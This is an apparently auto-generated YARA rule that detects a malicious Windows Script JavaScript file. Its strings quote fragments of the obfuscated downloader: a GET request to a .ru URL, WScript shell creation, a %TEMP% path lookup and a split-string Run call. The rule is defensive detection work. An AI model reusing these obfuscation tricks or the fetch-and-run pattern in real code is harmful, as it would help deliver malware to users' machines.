rule sig_20160428_6831518373a6106439a70e1b3fc5b20f {
  meta:
    description = "datamaliciousorder - file 20160428_6831518373a6106439a70e1b3fc5b20f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "497a2777fa0998e930b0b5c66f84eaa64545622616ef616f04277e298ccddbe4"

  strings:
    $s1  = "RrpEhkRbtPegEtsFykTzp[DisPljZgvKbcGgeLjmCiu](\"G\" + \"ET\", \"http://dotatest.ru/zowjsk\", false);" fullword ascii
    $s2  = "function BmhMbcWqlIupDggRxvStd() {return YczLgxYdaLraYfrElpDdl[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function VhrLlsCisEywEajBffYnv(KilXaoKomFsmCmbCzaXum){YczLgxYdaLraYfrElpDdl[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function VhrLlsCisEywEajBffYnv(KilXaoKomFsmCmbCzaXum){YczLgxYdaLraYfrElpDdl[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "if (RrpEhkRbtPegEtsFykTzp[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s6  = "return MigPmdUmsWjgVhhBtpTug - HjgLvnWbdTlsExgCowUhn;};" fullword ascii
    $s7  = "function SovYwwYypYneChhVvkSpo(MigPmdUmsWjgVhhBtpTug, HjgLvnWbdTlsExgCowUhn){NijAxcEhiQypRwlDavUzd = NijAxcEhiQypRwlDavUzd * 1; " ascii
    $s8  = "var FllBqxOofMiqBjxDlqAav = this[\"WScript\"];" fullword ascii
    $s9  = "var YczLgxYdaLraYfrElpDdl = function JndCbaPpjIxwBfeWndGxa() {return FllBqxOofMiqBjxDlqAav[GgdJseLhhNwuAwaWpkGmz](\"WScript\"+\"" ascii
    $s10 = "function BmhMbcWqlIupDggRxvStd() {return YczLgxYdaLraYfrElpDdl[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "var YczLgxYdaLraYfrElpDdl = function JndCbaPpjIxwBfeWndGxa() {return FllBqxOofMiqBjxDlqAav[GgdJseLhhNwuAwaWpkGmz](\"WScript\"+\"" ascii
    $s12 = "function FshCwpKjjJmtCzyXajOpg(){return UkzDjlVtaNlkAlvWdsYby + \"\";};" fullword ascii
    $s13 = "function SovYwwYypYneChhVvkSpo(MigPmdUmsWjgVhhBtpTug, HjgLvnWbdTlsExgCowUhn){NijAxcEhiQypRwlDavUzd = NijAxcEhiQypRwlDavUzd * 1; " ascii
    $s14 = "function GtpVvvNqkJgaJqkOydZpq() {return ((NunLzlLobVrzRedNbhXim == true) && (NunLzlLobVrzRedNbhXim == AolJzjVdlAwlDjtVlwBot)) ?" ascii
    $s15 = "function GtpVvvNqkJgaJqkOydZpq() {return ((NunLzlLobVrzRedNbhXim == true) && (NunLzlLobVrzRedNbhXim == AolJzjVdlAwlDjtVlwBot)) ?" ascii
    $s16 = "var NunLzlLobVrzRedNbhXim = false;" fullword ascii
    $s17 = "var CekWmwWurFsgNxeCfeVms = new this[\"D\"+\"ate\"]();" fullword ascii
    $s18 = "return SovYwwYypYneChhVvkSpo(1 == 1 ? QhgXqgTjtOxlKvfGjmYrg : 0, 1 == 1 ? HoqKinBmdIyrFejSkcYli : 0);" fullword ascii
    $s19 = "function UrpGrfDmlYdwMzaNdrUlw(){return GgdJseLhhNwuAwaWpkGmz;};" fullword ascii
    $s20 = "function GigIhmOfbXeyOsoDnrWhw(FdhIyfIgbRxwFwoGssQvn) {var AxvBtaMtqOraWryIztZoh = (1, 2, 3, 4, 5, FdhIyfIgbRxwFwoGssQvn); retur" ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}